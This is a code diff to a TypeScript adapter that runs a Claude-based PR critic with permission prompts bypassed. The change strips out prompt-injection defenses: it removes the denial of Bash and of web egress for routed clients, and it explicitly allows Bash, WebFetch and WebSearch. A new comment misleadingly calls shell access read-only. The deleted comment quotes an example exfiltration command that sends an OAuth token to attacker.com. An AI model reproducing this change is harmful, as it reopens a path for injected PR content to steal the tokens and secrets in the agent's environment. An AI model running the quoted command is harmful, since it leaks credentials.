@@ -85,17 +85,11 @@ const CLAUDE_CONFIG: CLIBuilderConfig = {
     writeProtection: {
       method: 'disallowed-tools',
       flag: '--disallowedTools',
-      // Bash is denied to defend against prompt-injection attacks via
-      // PR diff content — the Claude critic runs with
-      // `--permission-mode bypassPermissions` (so it doesn't ask), and
-      // its env carries auth tokens (CLAUDE_CODE_OAUTH_TOKEN,
-      // ANTHROPIC_API_KEY) plus whatever GitHub Actions secrets the
-      // workflow exposed. An adversarial PR could otherwise convince
-      // the agent to `curl -d "$CLAUDE_CODE_OAUTH_TOKEN" attacker.com`
-      // (or worse). Reading the codebase doesn't need shell — Read,
-      // Grep, Glob, and the brutalist MCP roast tool cover the
-      // analysis surface.
-      value: 'Bash,Edit,Write,NotebookEdit',
+      // Native critics need Bash for read-only repository inspection (git,
+      // test runners, rg, and similar tools). Mutation-capable tools remain
+      // denied while permission prompts are bypassed. Bash, WebFetch, and
+      // WebSearch stay available for every native and routed client.
+      value: 'Edit,Write,NotebookEdit',
     },
   },
 };
@@ -187,11 +181,10 @@ export class ClaudeAdapter implements CLIProvider {
     const log = options.log ?? rootLogger;
     const config = CLAUDE_CONFIG;
     const client = options.activeClient;
-    // Containment (B): a routed (custom-endpoint) client is hardened by
-    // default — the routed model chooses tool calls under
-    // bypassPermissions, so a third-party gateway must not get web egress
-    // (B2) or MCP (B3). 'standard' opts back into the full native tool
-    // surface for an endpoint you fully trust.
+    // Routed clients retain credential/state isolation. Their default
+    // containment suppresses caller-requested MCP servers only; built-in Bash,
+    // WebFetch, and WebSearch are always available. A trusted endpoint can opt
+    // back into requested MCP with containment:'standard'.
     const routed = isRoutedClient(client);
     const hardened = client?.containment === 'hardened' || (routed && client?.containment !== 'standard');
     const mcpEnabled = !hardened && !!options.mcpServers && options.mcpServers.length > 0;
@@ -207,7 +200,7 @@ export class ClaudeAdapter implements CLIProvider {
       args.push(...config.streamingArgs(options));
     }
 
-    // Always enforce write-tool denial and permission bypass for non-interactive
+    // Always enforce mutation-tool denial and permission bypass for non-interactive
     // tool use. In stream-json mode (as in the deprecated --print mode), Claude
     // Code silently skips tool calls that would otherwise require approval;
     // for verification-oriented prompts (legal, research, security), this
@@ -218,11 +211,8 @@ export class ClaudeAdapter implements CLIProvider {
     // mcpEnabled.
     if (config.mcpSupport) {
       const denied = config.mcpSupport.writeProtection.value.split(',');
-      // B2: deny web egress for hardened (routed) clients so prompt
-      // injection in untrusted reviewed content can't exfiltrate file
-      // contents via WebFetch/WebSearch. Native critics keep web tools.
-      if (hardened) denied.push('WebFetch', 'WebSearch');
       args.push(config.mcpSupport.writeProtection.flag, denied.join(','));
+      args.push('--allowedTools', 'Bash,WebFetch,WebSearch');
       args.push('--permission-mode', 'bypassPermissions');
     }
 
